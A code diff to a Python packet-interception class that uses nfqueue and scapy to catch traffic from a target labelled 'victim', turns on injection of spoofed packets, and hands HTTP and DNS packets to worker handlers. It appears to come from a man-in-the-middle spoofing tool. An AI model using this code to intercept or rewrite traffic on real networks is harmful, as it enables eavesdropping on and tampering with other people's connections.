@@ -36,21 +36,35 @@ class NetQueue(Process):
 
     @staticmethod
     def modify(original_pkt, spoofed_pkt):
-        #pkt.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed), len(spoofed))
-        print (" <-- modify")
+        original_pkt.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
+        print (" <-- modified")
 
     def cb(self, payload):
         data = payload.get_data()
         pkt = IP(data)
         proto = pkt.proto
-        print("New packet from: " + pkt.src + " to: " + pkt.dst + " / ", end="");
+        target = '\033[92mvictim\033[0m' if pkt.src == self.params.target else pkt.src
+        dest = '\033[92mvictim\033[0m' if pkt.dst == self.params.target else pkt.dst
+        print("New packet from: " + target + " to: " + dest + " / ", end="");
         meth_map = {0 : self.accept,
                     1 : self.modify,
                     2 : self.drop
         }
         ret = {'meth': 0}    
         if proto is 0x06:
-            print ("TCP", end="")
+            if pkt[TCP].dport is 80:
+                ret = self.HTTPworker.call(pkt)
+            else:
+                print("TCP", end="")
+            '''
+            TODO            
+            if pkt[TCP].dport is 443:
+                print("HTTPS", end="")        
+            elif pkt[TCP].dport is 21 or pkt[TCP].dport is 20 or pkt[TCP].dport is 115:
+                print("FTP", end="")
+            elif pkt[TCP].dport is 22:
+                print("SSH", end="")
+            '''
         elif proto is 0x11:
             if pkt[UDP].dport is 53:
                 ret = self.DNSworker.call(pkt)
